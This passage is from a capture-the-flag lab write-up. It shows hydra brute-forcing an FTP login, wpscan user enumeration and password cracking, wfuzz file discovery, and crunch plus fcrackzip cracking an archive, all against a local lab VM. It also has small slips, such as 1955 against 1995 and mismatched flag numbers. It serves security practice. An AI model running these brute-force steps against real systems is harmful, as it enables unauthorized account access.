</span><span class='line'>+ Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/lukeiamyourfather/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ OSVDB-3268: /lookalivelowbridge/: Directory indexing found.
</span><span class='line'>+ Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/lookalivelowbridge/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/flag-numero-uno.txt<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ <span class="p">&amp;</span>ldquo<span class="p">;</span>robots.txt<span class="p">&amp;</span>rdquo<span class="p">;</span> contains <span class="m">4</span> entries which should be manually viewed.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span></code></pre></td></tr></table></div></figure></p>

<p>I noticed that the robot file <code>robots.txt</code> is found and including 4 entries:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>User-agent: *
</span><span class='line'>Disallow: /6packsofb<span class="p">&amp;</span>hellip<span class="p">;</span>soda
</span><span class='line'>Disallow: /lukeiamyourfather
</span><span class='line'>Disallow: /lookalivelowbridge
</span><span class='line'>Disallow: /flag-numero-uno.txt
</span></code></pre></td></tr></table></div></figure></p>

<h3>The 1st Flag</h3>

<p><img class="left" src="/downloads/tommyboy1/1.png"></p>

<p>The 1st Flag is <font color="red"><code>B34rcl4ws</code></font></p>

<p>Also checked other folders but nothing found, so I decited to move on.</p>

<p>Then, by checking the source code of index page on port 80, hidden comments are found:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;title&gt;</span>Welcome to Callahan Auto<span class="nt">&lt;/title&gt;</span>
</span><span class='line'><span class="nt">&lt;body&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;H1&gt;&lt;center&gt;</span>Welcome to Callahan Auto!<span class="nt">&lt;/center&gt;&lt;/H1&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;font</span> <span class="na">color=</span><span class="s">&quot;FF3339&quot;</span><span class="nt">&gt;&lt;H2&gt;</span>SYSTEM ERROR!<span class="nt">&lt;/H2&gt;&lt;/font&gt;</span>
</span><span class='line'>If your&#39;e reading this, the Callahan Auto customer ordering system is down.  Please restore the backup copy immediately.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;p&gt;</span>
</span><span class='line'>See Nick in IT for assistance.
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: backup copy is in Big Tom&#39;s home folder--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: can you give me access too? Big Tom&#39;s the only one w/password--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: Yeah yeah, my processor can only handle one command at a time--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: please, I&#39;ll ask nicely--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: I will set you up with admin access *if* you tell Tom to stop storing important information in the company blog--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: Deal.  Where&#39;s the blog again?--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It&#39;s here if you don&#39;t remember: https://www.youtube.com/watch?v=VUxOd4CszJ8--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: Ah! How could I forget?  Thanks--&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the comment, I got a YouTube hint: <font color="red"><code>https://www.youtube.com/watch?v=VUxOd4CszJ8</code></font>, after checked the youtube, I got the hidden blog path is <font color="red"><code>http://10.1.1.141/prehistoricforest</code></font>.</p>

<p>From the YouTube video, I got the key to access to the hidden blog (<font color="red"><em>Hint:</em></font> <strong>if met Database Error, restart the target VM should fix the problem</strong>) and found the 2nd flag clue under the post <code>Announcing the Callahan internal company blog!</code>, the URL is <code>http://10.1.1.141/prehistoricforest/index.php/2016/07/06/announcing-the-callahan-internal-company-blog/</code></p>

<p><img class="left" src="/downloads/tommyboy1/2.png"></p>

<h3>The 2nd Flag</h3>

<p><img class="left" src="/downloads/tommyboy1/3.png"></p>

<p>The 2nd Flag is <font color="red"><code>Z4l1nsky</code></font></p>

<p>Another hint from the post <code>SON OF A!</code>:</p>

<p><img class="left" src="/downloads/tommyboy1/4.png"></p>

<p>There is another Image File under the folder <code>http://10.1.1.141/richard/shockedrichard.jpg</code></p>

<p>By checking the imga file with tool <code>exif</code>, I noticed that there is a MD5 hash in User Comment:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# exif shockedrichard.jpg
</span><span class='line'>EXIF tags in <span class="p">&amp;</span>lsquo<span class="p">;</span>shockedrichard.jpg<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>Intel<span class="p">&amp;</span>rsquo<span class="p">;</span> byte order<span class="o">)</span>:
</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-
</span><span class='line'>Tag                 <span class="p">|</span>Value
</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-
</span><span class='line'>Software            <span class="p">|</span>Google
</span><span class='line'>Copyright           <span class="p">|</span>Copyright © <span class="m">1995</span> Paramount Pictures Corporation. Credit: ©
</span><span class='line'>X-Resolution        <span class="p">|</span>72
</span><span class='line'>Y-Resolution        <span class="p">|</span>72
</span><span class='line'>Resolution Unit     <span class="p">|</span>Inch
</span><span class='line'>Exif Version        <span class="p">|</span>Exif Version 2.2
</span><span class='line'>User Comment        <span class="p">|</span>ce154b5a8e59c89732bc25d6a2e6b90b
</span><span class='line'>Pixel X Dimension   <span class="p">|</span>1600
</span><span class='line'>Pixel Y Dimension   <span class="p">|</span>1029
</span><span class='line'>FlashPixVersion     <span class="p">|</span>FlashPix Version 1.0
</span><span class='line'>Color Space         <span class="p">|</span>Internal error <span class="o">(</span>unknown value 65535<span class="o">)</span>
</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-
</span></code></pre></td></tr></table></div></figure></p>

<p>By cracking the hash online and got the cracked password is <font color="red"><code>spanky</code></font>></p>

<p>In the other post <code>Protected: Status of restoring company home page</code>, I found a password is needed.</p>

<p><img class="left" src="/downloads/tommyboy1/5.png"></p>

<p>Then I input <font color="red"><code>spanky</code></font> as the password and got into the protected blog.</p>

<p>Some important information from the blog:</p>

<ul>
<li><p>In order to restore, there is a backup file called <code>callahanbak.bak</code> that we can rename it to <code>index.html</code>. (We have to do this under Big Tom&rsquo;s account via SSH)</p></li>
<li><p>Big Tom&rsquo;s account name should be able to find in the user list and may not be called as bigtom but easy to recognize.</p></li>
<li><p>There is a FTP service running on non-standard port (65543, which is found by NMAP in the previous step) and can be accessed by nick&rsquo;s account.</p></li>
<li><p>Nick&rsquo;s account name is <code>nickburns</code> and the password is very easy to guess.</p></li>
<li><p>Nick is not able to access SSH but only FTP.</p></li>
</ul>


<p>Based on the information above, I use <code>hydra</code> to do a quick brute force scanning:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# hydra -e nsr -l nickburns &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp://10.1.1.141:65534/&quot;</span>&gt;ftp://10.1.1.141:65534/&lt;/a&gt;
</span><span class='line'>Hydra v8.2 <span class="p">&amp;</span>copy<span class="p">;</span> <span class="m">2016</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> starting at 2016-09-04 22:36:19
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">3</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">3</span> login tries <span class="o">(</span>l:1/p:3<span class="o">)</span>, ~0 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 65534
</span><span class='line'><span class="o">[</span>65534<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.141   login: nickburns   password: nickburns
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> finished at 2016-09-04 22:36:20
</span></code></pre></td></tr></table></div></figure></p>

<p>and found Nick&rsquo;s FTP login credencial is <font color="red"><code>nickburns / nickburns</code></font></p>

<p>Now I login to FTP as Nick and downloaded the only file <code>readme.txt</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# ftp 10.1.1.141 65534
</span><span class='line'>Connected to 10.1.1.141.
</span><span class='line'><span class="m">220</span> Callahan_FTP_Server 1.3.5
</span><span class='line'>Name <span class="o">(</span>10.1.1.141:root<span class="o">)</span>: nickburns
</span><span class='line'><span class="m">331</span> Password required <span class="k">for</span> nickburns
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> User nickburns logged in
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; list
</span><span class='line'>?Invalid <span class="nb">command</span>
</span><span class='line'>ftp&gt; dir
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful
</span><span class='line'><span class="m">150</span> Opening ASCII mode data connection <span class="k">for</span> file list
</span><span class='line'>-rw-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>   <span class="m">1</span> nickburns nickburns      <span class="m">977</span> Jul <span class="m">15</span> 02:37 readme.txt
</span><span class='line'><span class="m">226</span> Transfer <span class="nb">complete</span>
</span><span class='line'>ftp&gt; get readme.txt
</span><span class='line'><span class="nb">local</span>: readme.txt remote: readme.txt
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful
</span><span class='line'><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> readme.txt <span class="o">(</span><span class="m">977</span> bytes<span class="o">)</span>
</span><span class='line'><span class="m">226</span> Transfer <span class="nb">complete</span>
</span><span class='line'><span class="m">977</span> bytes received in 0.02 secs <span class="o">(</span>40.6745 kB/s<span class="o">)</span>
</span><span class='line'>ftp&gt; bye
</span><span class='line'><span class="m">221</span> Goodbye.
</span></code></pre></td></tr></table></div></figure></p>

<p>Due to this is WordPress application, I use <code>wpscan</code> to check if any vulnerability exists and enumerate users:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Identified the following <span class="m">4</span> user/s:
</span><span class='line'>    +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+
</span><span class='line'>    <span class="p">|</span> Id <span class="p">|</span> Login    <span class="p">|</span> Name              <span class="p">|</span>
</span><span class='line'>    +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+
</span><span class='line'>    <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> richard  <span class="p">|</span> richard           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> tom      <span class="p">|</span> Big Tom           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> tommy    <span class="p">|</span> Tom Jr.           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> michelle <span class="p">|</span> Michelle Michelle <span class="p">|</span>
</span><span class='line'>    +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Four WP users found:
<font color="red">
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>richard
</span><span class='line'>tom
</span><span class='line'>tommy
</span><span class='line'>michelle
</span></code></pre></td></tr></table></div></figure>
</font></p>

<p>Then use dictionary file <code>rockyou.txt</code> to brute force crack those users, and got tom&rsquo;s password cracked:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+
</span><span class='line'>  <span class="p">|</span> Id <span class="p">|</span> Login    <span class="p">|</span> Name              <span class="p">|</span> Password <span class="p">|</span>
</span><span class='line'>  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+
</span><span class='line'>  <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> richard  <span class="p">|</span> richard           <span class="p">|</span>          <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> tom      <span class="p">|</span> Big Tom           <span class="p">|</span> tomtom1  <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> tommy    <span class="p">|</span> Tom Jr.           <span class="p">|</span>          <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> michelle <span class="p">|</span> Michelle Michelle <span class="p">|</span>          <span class="p">|</span>
</span><span class='line'>  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/tommyboy1/6.png"></p>

<p>After change <code>User-Agent to</code> <code>Iphone 3</code>, I got the different content!</p>

<p><img class="left" src="/downloads/tommyboy1/7.png"></p>

<p>Use <code>wfuzz</code> with <code>rockyou.txt</code> to find out the hidden html file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -v -w /usr/share/wordlists/rockyou.txt -H <span class="p">&amp;</span>ldquo<span class="p">;</span>User-Agent:Mozilla/5.0 <span class="o">(</span>iPhone<span class="p">;</span> U<span class="p">;</span> CPU iPhone OS 3_0 like Mac OS X<span class="p">;</span> en-us<span class="o">)</span> AppleWebKit/528.18 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Version/4.0 Mobile/7A341 Safari/528.16<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>hc <span class="m">404</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.141:8008/NickIzL33t/FUZZ.html&quot;</span>&gt;http://10.1.1.141:8008/NickIzL33t/FUZZ.html&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Wfuzz 2.1.3 - The Web Bruteforcer                      *&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Target: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.141:8008/NickIzL33t/FUZZ.html&quot;</span>&gt;http://10.1.1.141:8008/NickIzL33t/FUZZ.html&lt;/a&gt;
</span><span class='line'>Total requests: 14344392&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ID  C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Request    &lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;97206:  0.040s   <span class="nv">C</span><span class="o">=</span><span class="m">200</span>     <span class="m">12</span> L       <span class="m">65</span> W      <span class="m">459</span> Ch     Apache/2.4.18 <span class="o">(</span>Ub                                                        <span class="p">&amp;</span>ldquo<span class="p">;</span>fallon1<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/tommyboy1/8.png"></p>

<h3>The 3rd Flag</h3>

<p><img class="left" src="/downloads/tommyboy1/9.png"></p>

<p>The 2nd Flag is <font color="red"><code>TinyHead</code></font></p>

<p>Here is also an encrypted backup zip file <code>t0msp4ssw0rdz.zip</code> and also a hint file which including the clues about password:</p>

<p><img class="left" src="/downloads/tommyboy1/10.png"></p>

<p>Password information:</p>

<ul>
<li>start with <code>bev</code></li>
<li>one uppercase character</li>
<li>two numbers</li>
<li>two lowercase characters</li>
<li>one symbol</li>
<li>1955</li>
</ul>


<p><font color="red"><code>bev[A-Z][0-9][0-9][a-z][a-z][symbol]1955</code></font></p>

<p>Then I use <code>crunch</code> to generate a [dictionary list][1] with given pattern:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# crunch <span class="m">13</span> <span class="m">13</span> -t bev,%%@@^1995 -o pass_dict.lst
</span><span class='line'>Crunch will now generate the following amount of data: <span class="m">812011200</span> bytes
</span><span class='line'><span class="m">774</span> MB
</span><span class='line'><span class="m">0</span> GB
</span><span class='line'><span class="m">0</span> TB
</span><span class='line'><span class="m">0</span> PB
</span><span class='line'>Crunch will now generate the following number of lines: 58000800&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;crunch:  27% completed generating output&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;crunch:  53% completed generating output&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;crunch:  83% completed generating output&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;crunch: 100% completed generating output
</span></code></pre></td></tr></table></div></figure></p>

<p>Then use <code>fcrackzip</code> with the generated dictionary file to crack the encrypted store zip file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# fcrackzip -v -D -u -p pass_dict.lst t0msp4ssw0rdz.zip
</span><span class='line'>found file <span class="p">&amp;</span>lsquo<span class="p">;</span>passwords.txt<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="o">(</span>size cp/uc    332/   641, flags 9, chk 9aad<span class="o">)</span>
</span><span class='line'>checking pw bevG72kn~1995&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;PASSWORD FOUND!!!!: <span class="nv">pw</span> <span class="o">==</span> bevH00tr<span class="nv">$1995</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The password is <font color="red"><code>bevH00tr$1995</code></font> and the unzipped file is <font color="red"><code>password.txt</code></font></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
